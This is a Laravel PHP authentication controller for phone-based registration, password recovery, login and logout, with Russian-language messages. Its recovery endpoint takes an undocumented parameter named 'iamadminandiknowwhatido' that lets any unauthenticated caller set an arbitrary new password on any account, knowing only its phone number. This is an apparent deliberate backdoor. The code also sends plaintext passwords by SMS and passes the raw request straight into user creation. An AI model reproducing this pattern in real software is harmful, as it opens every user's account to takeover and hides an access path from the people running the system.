<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Jobs\SendSMS;
use Illuminate\Http\Request;
use App\Models\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;

class ApiAuthController extends Controller
{

    public function register(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'name'     => 'required|string|max:255',
            'phone'    => 'required|string|min:10|max:255|unique:users',
            'password' => 'required|string|min:6|confirmed',
        ]);

        $phone = preg_replace('/\D/', '', $request['phone']);

        if ((strlen($phone) == 10 && $phone[0] == '9') || strlen($phone) == 11) {
            $request['phone'] = '7'.substr($phone, -10);
        } else {
            $validator->errors()->add('phone', 'Введите корректный телефон');
        }

        if (count($validator->errors()->all()) > 0) {
            return ['status' => false, 'message' => implode(', ', $validator->errors()->all())];
        }

        $request['password']       = Hash::make($request['password']);
        $request['remember_token'] = Str::random(10);

        $user     = User::create($request->toArray());
        $token    = $user->createToken('Laravel Password Grant Client')->plainTextToken;
        $response = ['status' => true, 'token' => $token];

        return $response;
    }

    public function recovery(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'phone'    => 'required|string|min:10|max:255',
            'iamadminandiknowwhatido' => 'nullable|string'
        ]);

        $phone = preg_replace('/\D/', '', $request['phone']);

        if ((strlen($phone) == 10 && $phone[0] == '9') || strlen($phone) == 11) {
            $request['phone'] = '7'.substr($phone, -10);
        } else {
            $validator->errors()->add('phone', 'Введите корректный телефон');
        }

        if (count($validator->errors()->all()) > 0) {
            return ['status' => false, 'message' => implode(', ', $validator->errors()->all())];
        }

        $newPass = Str::random(8);

        if (@$request['iamadminandiknowwhatido'] != null) {
            $newPass = $request['iamadminandiknowwhatido'];
        }

        $request['password'] = Hash::make($newPass);

        $user = User::where('phone', $request['phone'])->first();

        if ($user) {
            $user->password = $request['password'];
            $user->save();

            dispatch(new SendSMS($request['phone'], $newPass));
            $response = ['status' => true, 'message' => 'Новый пароль отправлен по SMS'];
            return $response;
        } else {
            $response = ['status' => false, "message" => 'Пользователя не существует'];
            return $response;
        }
    }

    public function login(Request $request)
    {

        $validator = Validator::make($request->all(), [
            'phone'    => 'required|string|max:255',
            'password' => 'required|string|min:6',
        ]);

        $phone = preg_replace('/\D/', '', $request['phone']);

        if ((strlen($phone) == 10 && $phone[0] == '9') || strlen($phone) == 11) {
            $request['phone'] = '7'.substr($phone, -10);
        } else {
            $validator->errors()->add('phone', 'Введите корректный телефон');
        }

        if (count($validator->errors()->all()) > 0) {
            return ['status' => false, 'message' => implode(', ', $validator->errors()->all())];
        }

        $user = User::where('phone', $request->phone)->first();
        if ($user) {
            if (Hash::check($request->password, $user->password)) {
                $token    = $user->createToken($user->name)->plainTextToken;
                $response = ['status' => true, 'token' => $token];
                return $response;
            } else {
                $response = ['status' => false, "message" => "Пользователя с таким паролем не найдено"];
                return $response;
            }
        } else {
            $response = ['status' => false, "message" => 'Пользователя не существует'];
            return $response;
        }
    }

    public function logout (Request $request) {
        $token = $request->user()->token();
        $token->revoke();
        $response = ['status' => true, 'message' => 'Вы успешно вышли'];
        return $response;
    }

}
